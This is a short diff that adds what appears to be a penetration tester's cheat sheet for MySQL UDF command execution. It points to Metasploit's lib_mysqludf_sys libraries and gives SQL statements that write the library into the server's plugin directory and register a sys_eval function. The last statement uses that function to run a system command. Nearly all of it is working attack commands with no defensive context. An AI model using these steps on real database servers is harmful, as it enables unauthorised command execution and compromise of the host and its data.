@@ -1,0 +1,25 @@
+# udf file path:
+/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so
+/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so
+
+
+# udf usage:
+First,try to upload the udf file to the target machine.
+
+# in mysql:
+
+show variables like "%plugin%";
+show variables like "%version%";
+
+#we must write udf file to the plugin directory
+#and we must use the correct version of udf file
+
+select load_file("/tmp/lib_mysqludf_sys_32.so") into dumpfile "/usr/lib/mysql/plugin/xxx.so";
+
+#create the udf system function
+
+create function sys_eval returns string soname 'xxx.so';
+
+#if return the OK,the we can use udf to execute system command
+
+select sys_eval('id');
